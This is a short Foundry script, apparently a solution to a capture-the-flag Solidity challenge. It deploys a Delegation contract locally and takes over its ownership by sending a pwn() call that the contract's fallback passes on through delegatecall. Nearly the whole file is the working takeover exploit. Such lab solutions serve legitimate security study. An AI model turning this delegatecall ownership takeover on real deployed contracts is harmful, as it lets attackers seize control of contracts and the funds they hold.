// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Delegation.sol";

contract Delegation_attack is Script {

    Delegate delegateContract;
    Delegation delegationContract;

    function setUp() public {}

    function run() public {
        vm.startPrank(address(1));
        delegateContract = new Delegate(address(1));
        delegationContract = new Delegation(address(delegateContract));
        vm.stopPrank();
        
        console.log(delegationContract.owner());
        
        vm.startPrank(address(2));
        bytes memory data = abi.encodeWithSignature("pwn()");
        address(delegationContract).call(data);
        address newOwnerDelegation = delegationContract.owner();
        console.log(newOwnerDelegation);
    }
}